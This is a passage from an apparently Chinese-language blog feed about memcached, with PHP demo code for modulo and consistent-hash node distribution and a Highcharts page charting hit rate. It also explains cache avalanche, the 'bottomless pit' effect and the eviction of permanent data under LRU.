class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/9/8</span><br><span class="line"> * Time: 14:44</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 模拟减少结点的请求</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">require (<span class="string">'./config.php'</span>);</span><br><span class="line">require (<span class="string">'./Distribute.php'</span>);</span><br><span class="line"><span class="variable">$mem</span> = new memcache();//实例化memcache操作类</span><br><span class="line"></span><br><span class="line"><span class="variable">$dis</span> = new <span class="variable">$_dis</span>(); //实例化分布式算法类</span><br><span class="line"></span><br><span class="line">//循环的添加服务器</span><br><span class="line">foreach(<span class="variable">$_mem</span> as <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="variable">$dis</span>-&gt;addNode(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//模拟减少一台服务器</span><br><span class="line"><span class="variable">$dis</span>-&gt;delNode(<span class="string">'D'</span>);</span><br><span class="line"></span><br><span class="line">//循环的命中memcached</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=1;<span class="variable">$i</span>&lt;10000;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$i</span> = sprintf(<span class="string">'%04d'</span>,<span class="variable">$i</span>%1000);</span><br><span class="line">    <span class="variable">$keyNode</span> = <span class="variable">$dis</span>-&gt;lookup(<span class="string">'key'</span>.<span class="variable">$i</span>); //根据key计算key所属的的节点</span><br><span class="line">    <span class="variable">$mem</span>-&gt;connect(<span class="variable">$_mem</span>[<span class="variable">$keyNode</span>][<span class="string">'host'</span>],<span class="variable">$_mem</span>[<span class="variable">$keyNode</span>][<span class="string">'port'</span>],2);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$mem</span>-&gt;get(<span class="string">'key'</span>.<span class="variable">$i</span>))&#123;</span><br><span class="line">        <span class="variable">$mem</span>-&gt;add(<span class="string">'key'</span>.<span class="variable">$i</span>,<span class="string">'value'</span>.<span class="variable">$i</span>,0,0); //没命中，则添加入memcache</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mem</span>-&gt;close();</span><br><span class="line">    usleep(3000);//睡眠一段时间</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Distribute.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/9/8</span><br><span class="line"> * Time: 13:49</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">interface <span class="built_in">hash</span>&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> _hash(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface distribution&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> lookup(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ModClass implements <span class="built_in">hash</span>,distribution&#123;</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$_nodes</span>=[];//节点数组</span><br><span class="line">    protected <span class="variable">$_count</span>=0;//结点的个数</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> _hash(<span class="variable">$str</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> sprintf(<span class="string">"%u"</span>,crc32(<span class="variable">$str</span>));//把字符串转成32位符号整数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> lookup(<span class="variable">$key</span>)&#123;</span><br><span class="line">        <span class="variable">$location</span> = <span class="variable">$this</span>-&gt;_hash(<span class="variable">$key</span>)%<span class="variable">$this</span>-&gt;_count;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;_nodes[<span class="variable">$location</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> addNode(<span class="variable">$node</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$node</span>,<span class="variable">$this</span>-&gt;_nodes))&#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;_nodes[] =<span class="variable">$node</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;_count+=1;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> delNode(<span class="variable">$node</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$node</span>,<span class="variable">$this</span>-&gt;_nodes))&#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="variable">$node</span>,<span class="variable">$this</span>-&gt;_nodes);</span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$this</span>-&gt;_nodes =array_merge(<span class="variable">$this</span>-&gt;_nodes);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;_count-=1;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Consistent implements <span class="built_in">hash</span>,distribution &#123;</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$_position</span>=[];</span><br><span class="line">    protected <span class="variable">$_nodes</span>=[];</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$_mul</span> =64;//每个节点对应64个虚节点</span><br><span class="line"></span><br><span class="line">    //对key进行转换</span><br><span class="line">    public <span class="keyword">function</span> _hash(<span class="variable">$str</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> sprintf(<span class="string">"%u"</span>,crc32(<span class="variable">$str</span>));//把字符串转成32位符号整数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算key所操作的node服务器</span><br><span class="line">    public <span class="keyword">function</span> lookup(<span class="variable">$key</span>)&#123;</span><br><span class="line">        <span class="variable">$point</span> = <span class="variable">$this</span>-&gt;_hash(<span class="variable">$key</span>);</span><br><span class="line">        <span class="variable">$node</span> = current(<span class="variable">$this</span>-&gt;_position);//先取圆环上最小的一个结点，当成结果</span><br><span class="line"></span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;_position as <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$point</span>&lt;=<span class="variable">$k</span>)&#123;</span><br><span class="line">                <span class="variable">$node</span>=<span class="variable">$v</span>;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        reset(<span class="variable">$this</span>-&gt;_position);</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$node</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    //增加服务器</span><br><span class="line">    public <span class="keyword">function</span> addNode(<span class="variable">$node</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>]))&#123;</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;<span class="variable">$this</span>-&gt;_mul;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$pos</span> = <span class="variable">$this</span>-&gt;_hash(<span class="variable">$node</span>.<span class="string">'-'</span>.<span class="variable">$i</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;_position[<span class="variable">$pos</span>]=<span class="variable">$node</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>][]=<span class="variable">$pos</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;_sortPos();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //对node进行排序，很重要的操作</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">_sortPos</span></span>()&#123;</span><br><span class="line">        ksort(<span class="variable">$this</span>-&gt;_position,SORT_REGULAR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> delNode(<span class="variable">$node</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isset(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>]))&#123;</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>] as <span class="variable">$k</span>)&#123;</span><br><span class="line">            <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;_position[<span class="variable">$k</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">getNodes</span></span>()&#123;</span><br><span class="line">        print_r(<span class="variable">$this</span>-&gt;_position);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>index.html</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Highcharts Example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.hcharts.cn/highcharts/highcharts.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"min-width: 310px; height: 400px; margin: 0 auto"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    Highcharts.setOptions(&#123;</span></span><br><span class="line"><span class="undefined">        global: &#123;</span></span><br><span class="line"><span class="actionscript">            useUTC: <span class="literal">false</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    Highcharts.chart(<span class="string">'container'</span>, &#123;</span></span><br><span class="line"><span class="undefined">        chart: &#123;</span></span><br><span class="line"><span class="actionscript">            type: <span class="string">'spline'</span>,</span></span><br><span class="line"><span class="actionscript">            animation: Highcharts.svg, <span class="comment">// don't animate in old IE</span></span></span><br><span class="line"><span class="undefined">            marginRight: 10,</span></span><br><span class="line"><span class="undefined">            events: &#123;</span></span><br><span class="line"><span class="actionscript">                load: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// set up the updating of the chart each second</span></span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">var</span> series = <span class="keyword">this</span>.series[<span class="number">0</span>];</span></span><br><span class="line"><span class="actionscript">                    setInterval(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> x = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime(), <span class="comment">// current time</span></span></span><br><span class="line"><span class="javascript">                            y = <span class="built_in">parseFloat</span>($.ajax(&#123;<span class="attr">url</span>:<span class="string">'calStats.php'</span>,<span class="attr">async</span>:<span class="literal">false</span>&#125;).responseText);</span></span><br><span class="line"><span class="actionscript">                        series.addPoint([x, y], <span class="literal">true</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="undefined">                    &#125;, 1000);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        title: &#123;</span></span><br><span class="line"><span class="actionscript">            text: <span class="string">'Memcached hits rate'</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        xAxis: &#123;</span></span><br><span class="line"><span class="actionscript">            type: <span class="string">'datetime'</span>,</span></span><br><span class="line"><span class="undefined">            tickPixelInterval: 150</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        yAxis: &#123;</span></span><br><span class="line"><span class="undefined">            title: &#123;</span></span><br><span class="line"><span class="actionscript">                text: <span class="string">'Value'</span></span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="undefined">            plotLines: [&#123;</span></span><br><span class="line"><span class="undefined">                value: 0,</span></span><br><span class="line"><span class="undefined">                width: 1,</span></span><br><span class="line"><span class="actionscript">                color: <span class="string">'#808080'</span></span></span><br><span class="line"><span class="undefined">            &#125;]</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        tooltip: &#123;</span></span><br><span class="line"><span class="actionscript">            formatter: <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> <span class="string">'&lt;b&gt;'</span> + <span class="keyword">this</span>.series.name + <span class="string">'&lt;/b&gt;&lt;br/&gt;'</span> +</span></span><br><span class="line"><span class="actionscript">                    Highcharts.dateFormat(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, <span class="keyword">this</span>.x) + <span class="string">'&lt;br/&gt;'</span> +</span></span><br><span class="line"><span class="actionscript">                    Highcharts.numberFormat(<span class="keyword">this</span>.y, <span class="number">2</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        legend: &#123;</span></span><br><span class="line"><span class="actionscript">            enabled: <span class="literal">false</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        exporting: &#123;</span></span><br><span class="line"><span class="actionscript">            enabled: <span class="literal">false</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        series: [&#123;</span></span><br><span class="line"><span class="actionscript">            name: <span class="string">'Random data'</span>,</span></span><br><span class="line"><span class="actionscript">            data: (<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// generate an array of random data</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> data = [],</span></span><br><span class="line"><span class="javascript">                    time = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime(),</span></span><br><span class="line"><span class="undefined">                    i;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">for</span> (i = <span class="number">-19</span>; i &lt;= <span class="number">0</span>; i += <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="undefined">                    data.push(&#123;</span></span><br><span class="line"><span class="undefined">                        x: time + i * 1000,</span></span><br><span class="line"><span class="undefined">                        y: 1</span></span><br><span class="line"><span class="undefined">                    &#125;);</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> data;</span></span><br><span class="line"><span class="undefined">            &#125;())</span></span><br><span class="line"><span class="undefined">        &#125;]</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>InitData.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/9/8</span><br><span class="line"> * Time: 14:13</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">//开启memcached各个端口的服务端</span><br><span class="line">//memcached.exe -m 4 -p 1121* -vvv *为端口号1-5</span><br><span class="line"></span><br><span class="line">require(<span class="string">'./config.php'</span>);</span><br><span class="line">require (<span class="string">'./Distribute.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mem</span> = new memcache();</span><br><span class="line"><span class="variable">$dis</span> = new <span class="variable">$_dis</span>();//分布式算法</span><br><span class="line"></span><br><span class="line">//循环的添加服务器</span><br><span class="line">foreach(<span class="variable">$_mem</span> as <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="variable">$dis</span>-&gt;addNode(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//初始化数据</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;1000;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$i</span> = sprintf(<span class="string">'%04d'</span>,<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">'key'</span>.<span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$value</span> = <span class="string">'value'</span>.<span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$keyNode</span> = <span class="variable">$dis</span>-&gt;lookup(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$mem</span>-&gt;pconnect(<span class="variable">$_mem</span>[<span class="variable">$keyNode</span>][<span class="string">'host'</span>],<span class="variable">$_mem</span>[<span class="variable">$keyNode</span>][<span class="string">'port'</span>],2);</span><br><span class="line">    <span class="variable">$mem</span>-&gt;add(<span class="string">'key'</span>.<span class="variable">$i</span>,<span class="string">'value'</span>.<span class="variable">$i</span>,0,0);</span><br><span class="line">    usleep(3000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"conplete"</span>;</span><br></pre></td></tr></table></figure></p><h1 id="缓存雪崩现象"><a href="#缓存雪崩现象" class="headerlink" title="缓存雪崩现象"></a>缓存雪崩现象</h1><p>该现象的产生是由某个缓存结点失效，导致其他结点的缓存命中率下降，缓存中缺失的数据去数据库查询，短时间内，造成数据库服务器崩溃</p><p>重启DB,短期又被压垮，缓存数据逐渐增加，DB反复多次启动多次之后，缓存才重建完毕，DB才稳定运行</p><p>或者是由于缓存周期性的失效，比如每6小时失效一次，每6小时将会有一个请求峰值，严重可能会令DB崩溃</p><h2 id="缓存雪崩解决方案"><a href="#缓存雪崩解决方案" class="headerlink" title="缓存雪崩解决方案"></a>缓存雪崩解决方案</h2><p>由于失效周期导致的雪崩的解决方案</p><ul><li>可以选择访问量小的时间段失效和更新缓存</li><li>设置随机3-9小时的生命周期，不同时失效，把工作分担到各个时间点上去</li></ul><h1 id="缓存的无底洞现象"><a href="#缓存的无底洞现象" class="headerlink" title="缓存的无底洞现象"></a>缓存的无底洞现象</h1><p>Facebook的工作人员反应2010年已达到3000个memcached节点，储存数千G的缓存。</p><p>他们发现一个问题–memcached的连接效率下降了，于是添加，memcached节点，添加完之后，并没有好转。</p><p>称为“无底洞”现象</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>以会员信息为例：</p><p>‘User-133-age’  22</p><p>‘user-133-height’ 170</p><p>‘user-89-age’ 60</p><p>‘user-89-height’ 182</p><p>当服务器增多，若采取一致哈希算法来做分布式，密度变大，133号用户的信息也被散落在更多的服务器，所以，同样是访问个人主页，得到的相同的个人信息，节点越多，要连接的节点也越多，对于memcached的连接数，并没有随着节点的增多而降低，问题出现。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>把某一组key，按其共同前缀来分布：<br>在用分布式算法求其节点时，应该以’user-133’来计算，而不是以user-133-age/name/height来计算，这样3个关于个人信息的key，都落在同一个节点，访问个人主页时，只需连接一个节点。</p><h1 id="永久数据被踢现象"><a href="#永久数据被踢现象" class="headerlink" title="永久数据被踢现象"></a>永久数据被踢现象</h1><p>数据设置为永久有效，却莫名其妙的丢失了</p><h2 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h2><p>由惰性删除和LRU删除算法引起的<br>可以简单理解为以下这样的过程：</p><ul><li>数据在内存中失效后，并不会立马被删除，只有在下次get时候，系统才会将其删除。</li><li>Memcache可以因此，被一些未被及时删除的数据占满空间。</li><li>加之LRU淘汰机制，永久数据如果很少被访问的话，在内存空间被占满的情况下，再有新数据被缓存，则永久数据，就有可能被删除。</li></ul><h2 id="官方解决方法："><a href="#官方解决方法：" class="headerlink" title="官方解决方法："></a>官方解决方法：</h2><p>永久数据和非永久数据分开放</p>]]></content>
      
      
      <categories>
          
          <category> memcached </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用webpack构建页面</title>
      <link href="/2018/08/29/%E4%BD%BF%E7%94%A8gulp-webpack%E6%9E%84%E5%BB%BA%E9%A1%B5%E9%9D%A2/"/>
      <url>/2018/08/29/%E4%BD%BF%E7%94%A8gulp-webpack%E6%9E%84%E5%BB%BA%E9%A1%B5%E9%9D%A2/</url>
      
